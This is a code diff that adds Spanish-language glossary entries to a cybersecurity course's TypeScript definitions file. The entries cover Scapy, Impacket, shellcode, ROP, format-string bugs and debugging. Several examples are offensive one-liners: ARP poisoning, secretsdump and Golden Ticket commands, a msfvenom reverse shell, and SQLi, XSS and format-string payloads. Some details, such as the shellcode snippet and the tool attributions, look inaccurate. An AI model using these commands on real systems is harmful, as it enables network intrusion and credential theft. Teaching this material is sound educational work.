@@ -9658,6 +9658,232 @@ export const DEFINITIONS: ConceptDefinition[] = [
     ],
     related: ["Wireshark", "SIEM y monitoreo", "Threat Intelligence"],
   },
+  // ── M9 · Python para CyberSec (continuación) ─────────────────────────────
+  {
+    id: 914,
+    module: 9,
+    term: "Scapy: Manipulación de Paquetes",
+    short: "Librería Python para crear, enviar y analizar paquetes de red capa por capa.",
+    detail:
+      "**Scapy** es el toolkit de Python para pentesters que necesitan control bajo nivel:\n" +
+      "```python\nfrom scapy.all import *\n# Crear paquete IP+TCP\npkt = IP(dst='target.com')/TCP(dport=80, flags='S')\n# Enviar y recibir respuesta\nans = sr1(pkt, timeout=2)\nans.show()  # Muestra capas\n```\n" +
+      "**Casos de uso**:\n" +
+      "• **Port scanning** — SYN scan (Nmap-style) sin dependencies\n" +
+      "• **ARP spoofing** — Redirigir tráfico en LAN local\n" +
+      "• **Packet crafting** — Crear payloads personalizados\n" +
+      "• **Network troubleshooting** — Diagnóstico de conectividad\n" +
+      "• **Exploitation** — Vectores de ataque custom",
+    examples: [
+      "Scan de puertos: `for port in [22,80,443]: sr1(IP(dst='target')/TCP(dport=port))`",
+      "ARP poisoning: `send(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst='target', psrc='attacker'), loop=1)`",
+    ],
+    related: ["Networking con Python", "Wireshark", "Nmap y herramientas de escaneo"],
+  },
+  {
+    id: 915,
+    module: 9,
+    term: "Impacket: Protocolos Windows desde Python",
+    short: "Librería para interactuar con SMB, NTLM, Kerberos, LDAP desde Python.",
+    detail:
+      "**Impacket** es indispensable para pentesters Windows:\n" +
+      "```python\nfrom impacket.smbconnection import SMBConnection\n# Conectar a share SMB\nsmbConn = SMBConnection('target', 'ip')\nsmbConn.login('user', 'pass')\n```\n" +
+      "**Funcionalidades clave**:\n" +
+      "• **SMB** — acceso a shares, lectura de archivos remotos\n" +
+      "• **NTLM** — hash grabbing, relay attacks\n" +
+      "• **Kerberos** — ticket forgery (Golden Ticket), credential impersonation\n" +
+      "• **LDAP** — enumeración de Active Directory\n" +
+      "• **RPC** — ejecución remota de comandos\n" +
+      "• **Secretsdump** — dump de NTDS.dit (hashes de DA)",
+    examples: [
+      "Dump de SAM remoto: `secretsdump.py DOMAIN/user:pass@target`",
+      "Golden Ticket: `ticketer.py -nthash KRBTGT_HASH -domain corp.local Administrator`",
+    ],
+    related: ["Windows Lateral Movement", "Active Directory attacks", "Credential theft"],
+  },
+  {
+    id: 916,
+    module: 9,
+    term: "Automatización con Python: Scripts vs Herramientas",
+    short: "Cuándo escribir un script Python vs usar Nmap/Metasploit/Burp, y patrones comunes.",
+    detail:
+      "**Regla de oro**: Python cuando necesitas **customización o integración**.\n" +
+      "| Caso | Herramienta | Razón |\n" +
+      "|---|---|---|\n" +
+      "| Port scan básico | Nmap | Más rápido, mejor parsing |\n" +
+      "| Port scan custom (lógica compleja) | Python + Scapy | Control total |\n" +
+      "| Exploit público | Metasploit | Testing rápido |\n" +
+      "| Exploit adaptado a target único | Python | Una única línea de comando |\n" +
+      "| Web fuzzing + análisis datos | Python + requests | Fácil pipeline |\n\n" +
+      "**Patterns útiles**:\n" +
+      "• **Threading/Multiprocessing** — paralelizar escaneos (`concurrent.futures`)\n" +
+      "• **Logging** — guardar eventos en archivo (`logging` module)\n" +
+      "• **Configuration files** — JSON/YAML para parámetros (`configparser`)\n" +
+      "• **Database** — guardar resultados (`sqlite3`, `psycopg2`)\n" +
+      "• **CLI arguments** — scripts parametrizables (`argparse`)",
+    examples: [
+      "Script que escanea 1000 IPs en paralelo: 10min. Nmap serial: 30min.",
+      "Parsear Nmap XML → insertar en DB + generar reporte: solo en Python es trivial.",
+    ],
+    related: ["¿Por qué Python?", "Librerías Clave", "DevSecOps automation"],
+  },
+  {
+    id: 917,
+    module: 9,
+    term: "Python en Forense Digital",
+    short: "Volatility3, análisis de memory dumps, extracción de artefactos con Python.",
+    detail:
+      "**Volatility3** es el framework de Python para forense de memoria:\n" +
+      "```bash\nvolatility3 -f memory.dump windows.pslist.PsList  # Listar procesos\nvolatility3 -f memory.dump windows.registry.hivelist  # Hives del registro\n```\n" +
+      "**Análisis offline**:\n" +
+      "```python\nimport volatility3.framework as framework\n# Programáticamente analizar dumps\n```\n" +
+      "**Casos de uso**:\n" +
+      "• **Detección de malware** — procesos ocultos, shellcode en memoria\n" +
+      "• **Recuperación de credenciales** — LSA secrets, SAM en RAM\n" +
+      "• **Timeline reconstruction** — eventos de Windows, network connections\n" +
+      "• **Carving de datos** — recuperar archivos eliminados de RAM\n" +
+      "• **Análisis de ataques** — detectar exploits, movimientos laterales",
+    examples: [
+      "Volatilit3: detectar mimikatz corriéndose en memoria (strings \"sekurlsa\")",
+      "Carving: recuperar credenciales de Firefox/Chrome cache",
+    ],
+    related: ["Incident Response", "Malware analysis", "Memory forensics"],
+  },
+  {
+    id: 918,
+    module: 9,
+    term: "OWASP Top 10 Testing con Python",
+    short: "Escribir tests automáticos para vulnerabilidades web (SQLi, XSS, CSRF).",
+    detail:
+      "**Python para automatizar auditoría web**:\n" +
+      "```python\nimport requests\nfrom urllib.parse import quote\n\n# Test SQLi\npayload = \"' OR '1'='1\"\nresp = requests.get(f\"http://target?id={quote(payload)}\")\nif 'error' in resp.text or 'mysql' in resp.text:\n    print(\"[!] SQLi Vulnerable\")\n```\n" +
+      "**Librerías**:\n" +
+      "• **requests** — HTTP client con session handling, cookies\n" +
+      "• **BeautifulSoup4** — parsear HTML, extraer forms\n" +
+      "• **Selenium** — testing de aplicaciones JS-heavy (SPAs)\n" +
+      "• **PyHyphen** — bruteforce de directorio web\n" +
+      "• **Paramiko** — SSH brute-force\n" +
+      "**Best practices**:\n" +
+      "• Setear headers User-Agent realistas\n" +
+      "• Respetar rate limiting (delays entre requests)\n" +
+      "• Logear todos los payloads y respuestas\n" +
+      "• Usar proxies (Burp, mitmproxy) para debugging",
+    examples: [
+      "XSS test: `payload = '<script>alert(1)</script>'` → meter en cada parámetro",
+      "CSRF: verificar ausencia de CSRF token en formas POST",
+    ],
+    related: ["OWASP Top 10", "Web Security", "Penetration Testing"],
+  },
+  // ── M12 · C/C++ y Low-Level Security (continuación) ──────────────────────
+  {
+    id: 919,
+    module: 12,
+    term: "Reverse Engineering con radare2",
+    short: "Herramienta open-source para análisis de binarios: disassembler, debugger, decompiler.",
+    detail:
+      "**radare2** es el Swiss Army knife del reverser:\n" +
+      "```bash\nr2 binary         # Abrir binario en r2\naaa               # Auto-analyze (encuentra funciones)\npd @ main         # Disassemble función main\npV                # Visual panels\ndb 0x1234         # Poner breakpoint\ndc                # Debug continuar\n```\n" +
+      "**Capacidades**:\n" +
+      "• **Disassembly** — ARM, x86, MIPS, PowerPC, SPARC, etc.\n" +
+      "• **Debugger** — breakpoints, step-through, memory inspection\n" +
+      "• **Decompiler** — genera C-like pseudocódigo (Cutter GUI integra ghidra decompiler)\n" +
+      "• **Scripting** — r2pipe para Python/JavaScript automation\n" +
+      "• **Patches** — modificar bytes y re-generar binario\n" +
+      "**Alternativas**: IDA Pro (costoso, mejor decompiler), Ghidra (NSA, gratis)",
+    examples: [
+      "Encontrar main: `entry0` → seguir JMP a main → disassemble",
+      "Buscar strings sospechosas: `iz` para importadas, `i` para todas",
+    ],
+    related: ["Buffer Overflow", "Shellcode", "Malware analysis"],
+  },
+  {
+    id: 920,
+    module: 12,
+    term: "Shellcode y Payload Crafting",
+    short: "Escribir assembly/machine code que se ejecuta en memoria: msfvenom, pwntools.",
+    detail:
+      "**Shellcode** es código posicional-independiente (no depende de direcciones fijas):\n" +
+      "```asm\n; x86 Linux execve(\"/bin/sh\", NULL, NULL) - 21 bytes\nmov $11, %al      # syscall execve\nmov $0x68732f2f, %ebx  # \"//sh\" (little endian)\npush %ebx\nmov %esp, %ecx\nint $0x80\n```\n" +
+      "**Herramientas**:\n" +
+      "• **msfvenom** — genera shellcode (Reverse shell TCP, Bind shell, etc.)\n" +
+      "• **pwntools** — Python library para exploit automation\n" +
+      "• **Assembler (nasm)** — compilar assembly a machine code\n" +
+      "**Restricciones**:\n" +
+      "• No puede contener null bytes (\\x00) si se inyecta en strings\n" +
+      "• Debe evitar caracteres filtrados (alphanumeric encoding)\n" +
+      "• Debe ser relocatable (no referencias a direcciones absolutas)",
+    examples: [
+      "Reverse shell TCP: `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444`",
+      "Payload encriptado: `msfvenom ... -e x86/shikata_ga_nai -i 3` (XOR encode 3 veces)",
+    ],
+    related: ["Buffer Overflow", "Exploit development", "ROP chains"],
+  },
+  {
+    id: 921,
+    module: 12,
+    term: "Return-Oriented Programming (ROP)",
+    short: "Encadenar pequeños bloques de código ('gadgets') para bypassear DEP/NX.",
+    detail:
+      "**ROP** es la técnica principal para bypassear NX bit (stack no ejecutable):\n" +
+      "**Idea**: en vez de inyectar shellcode executable, reutiliza código ya en memoria.\n" +
+      "```\n1. Buffer overflow → sobrescribe return address\n2. Return a gadget 1: pop %rdi; ret  (carga parámetro en rdi)\n3. Gadget 2: mov %rdi, %rax; ret\n4. Gadget 3: syscall                (hace syscall)\n```\n" +
+      "**Herramientas**:\n" +
+      "• **ropper** — find gadgets automáticamente\n" +
+      "• **ropgadget** — busca ROP gadgets en binarios\n" +
+      "• **pwntools** — ayuda a construir ROP chains\n" +
+      "**Desafíos**:\n" +
+      "• Encontrar gadgets útiles (especialment en binarios pequeños)\n" +
+      "• Evitar badchars y null bytes\n" +
+      "• ASLR hace direcciones impredecibles → necesita info leak primero",
+    examples: [
+      "Gadget: `0x12345: pop rdi; pop rsi; ret` — con 2 pops, carga 2 parámetros",
+      "ROP to call mprotect: cambiar stack de rw → rwx, luego jump a shellcode",
+    ],
+    related: ["Buffer Overflow", "ASLR bypass", "Information disclosure"],
+  },
+  {
+    id: 922,
+    module: 12,
+    term: "Formato String Vulnerabilities",
+    short: "Explotar funciones printf(user_input) para leak/write memoria.",
+    detail:
+      "**Format String** es una clase de vulva que explotaa string handling inseguro:\n" +
+      "```c\nchar buf[256];\ngets(buf);\nprintf(buf);  // ¡VULNERABLE!\n// Si buf=\"%x.%x.%x\", printf printea valores del stack\n```\n" +
+      "**Ataques**:\n" +
+      "• **Read leak** — `%x` lee stack, `%s` lee memoria, `%p` direcciones\n" +
+      "• **Write arbitrary** — `%n` escribe en dirección apuntada\n" +
+      "• **Overwrite return address** — cambiar dónde salta el programa\n" +
+      "• **RCE** — escribir shellcode address en GOT table\n" +
+      "**Defensas**:\n" +
+      "• Nunca: `printf(user_input)` — usar `printf(\"%s\", user_input)`\n" +
+      "• RELRO (Read-Only Relocation) — protege GOT table\n" +
+      "• PIE (Position Independent Executable) — direcciones aleatorias",
+    examples: [
+      "Leak canary del stack: `printf(\"%8$p\")` (8º argumento format string)",
+      "Overwrite función pointer: `printf(\"%1234d%n\")` escribe 1234 en dirección",
+    ],
+    related: ["Buffer Overflow", "Memory corruption", "PWN challenges"],
+  },
+  {
+    id: 923,
+    module: 12,
+    term: "Debugging y Análisis Dinámico",
+    short: "GDB, ltrace, strace para entender comportamiento en runtime.",
+    detail:
+      "**Tools**:\n" +
+      "• **GDB** — GNU Debugger; breakpoints, step, inspect memory/registers\n" +
+      "• **strace** — trace system calls (open, read, write, mmap, etc.)\n" +
+      "• **ltrace** — trace library calls (malloc, sprintf, printf)\n" +
+      "• **objdump** — disassemble binarios\n" +
+      "• **readelf** — lee ELF headers (símbolos, secciones)\n" +
+      "**Workflow típico**:\n" +
+      "```bash\nstrace ./binary 2>&1 | grep open  # ¿qué archivos toca?\nltrace ./binary                    # ¿qué libcalls?\ngdb ./binary\n(gdb) disas main                   # disassemble\n(gdb) break main                   # breakpoint\n(gdb) run arg1 arg2               # ejecutar\n(gdb) info registers              # ver CPUstate\n(gdb) print $rax                  # print register\n(gdb) x/100x $rsp                 # examinar memoria (100 hex dwords)\n```\n" +
+      "**Análisis de malware**: strace para ver qué hace (writes, exec, etc.)",
+    examples: [
+      "Detectar hardcoded password: `strace` + grep \"strcmp\" calls",
+      "Paso a paso un buffer overflow: `gdb` + poner breakpoint pre-overflow",
+    ],
+    related: ["Reverse Engineering", "Exploit development", "Malware analysis"],
+  },
 ];
 
 export function definitionsByModule(moduleId: number): ConceptDefinition[] {
